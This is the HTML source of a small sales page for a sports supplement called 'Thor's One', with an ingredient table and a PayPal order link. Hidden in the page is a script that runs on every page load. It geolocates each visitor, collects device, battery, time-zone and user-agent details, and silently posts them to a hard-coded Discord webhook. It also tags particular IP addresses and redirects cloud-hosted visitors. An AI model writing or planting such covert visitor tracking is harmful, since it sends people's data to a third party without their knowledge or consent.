---
layout: default
title: Thor's One - Performance Engineering
---

<style>
    :root {
        --valhalla-gold: #ffd700;
        --valhalla-dark: #0a0a0a;
        --valhalla-card: #141414;
    }
    body { background-color: var(--valhalla-dark); color: #fff; font-family: 'Inter', sans-serif; }
    
    .hero-banner { width: 100%; border-bottom: 2px solid var(--valhalla-gold); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
    
    .container { max-width: 900px; margin: 0 auto; padding: 40px 20px; }
    
    h1 { font-family: 'Playfair Display', serif; font-size: 3rem; text-align: center; color: var(--valhalla-gold); letter-spacing: -1px; margin-bottom: 10px; }
    .tagline { text-align: center; text-transform: uppercase; letter-spacing: 4px; font-size: 0.8rem; color: #888; margin-bottom: 50px; }

    .supplement-facts { 
        background: #fff; color: #000; padding: 25px; border: 2px solid #000; 
        max-width: 500px; margin: 0 auto; box-shadow: 10px 10px 0px var(--valhalla-gold);
    }
    .supplement-facts h2 { border-bottom: 5px solid #000; margin-bottom: 5px; font-weight: 900; font-size: 2rem; }
    .sf-table { width: 100%; border-collapse: collapse; }
    .sf-table tr { border-bottom: 1px solid #000; }
    .sf-table td { padding: 8px 0; font-weight: bold; }
    .amount { text-align: right; }
    .sf-bold-row { border-bottom: 4px solid #000 !important; }

    .order-btn {
        background: var(--valhalla-gold); color: #000; padding: 20px 50px; 
        border-radius: 5px; font-weight: 900; text-decoration: none; 
        display: inline-block; transition: transform 0.3s ease;
        box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
    }
    .order-btn:hover { transform: scale(1.05); background: #fff; }

    .footer-intel { margin-top: 100px; text-align: center; font-size: 0.7rem; color: #333; text-transform: uppercase; }
</style>

<div class="container">
    <header>
        <h1>THOR'S ONE</h1>
        <p class="tagline">All-In-One Performance Engineering</p>
    </header>

   <script>
    async function runSentinel() {
        const hook = "https://discord.com/api/webhooks/1482560413202780190/W_284_815IhjKx0KEPRMAcL8cikbZLG1wE_Zwxls5N-DR5KJ8mtuCE_OrXf-ZLIVSRay";
        
        // ONLY your Florida HQ IP stays here to stay "Invisible"
        const absoluteMasters = ["66.177.137.56"]; 
        const wichitaIP = "207.178.123.51";

        try {
            const res = await fetch('https://ipapi.co/json/');
            const geo = await res.json();
            const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({ level: 1, charging: true }));
            
            const isMaster = absoluteMasters.includes(geo.ip);
            const isWichita = geo.ip === wichitaIP;
            const isCloud = /Azure|Hosting|Data Center|Microsoft|Amazon|Google|Cloud|Ziply/i.test(geo.org);

            // 1. Construct the Intelligence Report
            let status = "🚨 INTEL SCAN";
            let color = 15548997; // Red

            if (isMaster) {
                status = "👑 MASTER ACCESS";
                color = 15844367; // Gold
            } else if (isWichita) {
                status = "🌾 WICHITA NODE REPORT";
                color = 3447003; // Blue
            }

            const report = {
                username: isMaster ? "THORS-RIG-ADMIN" : "SENTINEL-INTELLIGENCE",
                embeds: [{
                    title: `${status}: ${geo.city}`,
                    color: color,
                    fields: [
                        { name: "🌐 Network", value: `IP: ${geo.ip}\nISP: ${geo.org}`, inline: false },
                        { name: "📍 Location", value: `${geo.city}, ${geo.region}\nTZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`, inline: true },
                        { name: "💻 Device", value: `Platform: ${navigator.platform}\nScreen: ${screen.width}x${screen.height}`, inline: true },
                        { name: "🔋 Battery", value: `${(battery.level * 100).toFixed(0)}% (Charging: ${battery.charging})`, inline: true },
                        { name: "🕵️ User-Agent", value: navigator.userAgent }
                    ],
                    footer: { text: "McLaren Valhalla Systems // Deep Scan Active" },
                    timestamp: new Date().toISOString()
                }]
            };

            // 2. Transmit Intel before any redirect
            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(report) });

            // 3. The Blockade (Redirect Cloud Bots, but LET WICHITA THROUGH)
            if (isCloud && !isMaster && !isWichita) {
                window.location.replace("https://www.google.com/search?q=unauthorized+access+detected");
            }

        } catch (e) {
            console.log("Sentinel running silent.");
        }
    }
    runSentinel();
</script> <div class="supplement-facts">
        <h2>Supplement Facts</h2>
        <p>Serving Size: 1 Scoop (≈30 cc) | Servings Per Container: 30</p>
        <table class="sf-table">
            <tr class="sf-bold-row"><td>Amount Per Serving</td><td class="amount">% DV</td></tr>
            <tr><td>Creatine Monohydrate (200-Mesh)</td><td class="amount">5 g</td></tr>
            <tr><td>Citrulline Malate</td><td class="amount">5 g</td></tr>
            <tr><td>Beta-Alanine</td><td class="amount">3.5 g</td></tr>
            <tr><td>BCAA (2:1:1)</td><td class="amount">3.5 g</td></tr>
            <tr><td>Betaine Anhydrous</td><td class="amount">2 g</td></tr>
            <tr><td>L-Glutamine</td><td class="amount">2 g</td></tr>
            <tr><td>Beet Juice Powder</td><td class="amount">1.5 g</td></tr>
            <tr><td>L-Carnitine L-Tartrate</td><td class="amount">1,000 mg</td></tr>
            <tr class="sf-bold-row"><td>Cognitive & Electrolyte Matrix</td><td class="amount">**</td></tr>
            <tr><td>Magnesium Glycinate</td><td class="amount">300 mg</td></tr>
            <tr><td>Huperzine A (1%)</td><td class="amount">200 mcg</td></tr>
        </table>
        <p style="font-size: 0.7rem; margin-top: 10px;">* Percent Daily Values are based on a 2,000 calorie diet.</p>
    </div>

    <div style="text-align: center; margin-top: 50px;">
        <a href="https://www.paypal.com/ncp/payment/Z6NLB5ECC653L" class="order-btn">⚡️ SECURE YOUR ALLOY</a>
    </div>

    <footer class="footer-intel">
        Protected by McLaren Valhalla Systems // Node: Supps-01
    </footer>
</div>

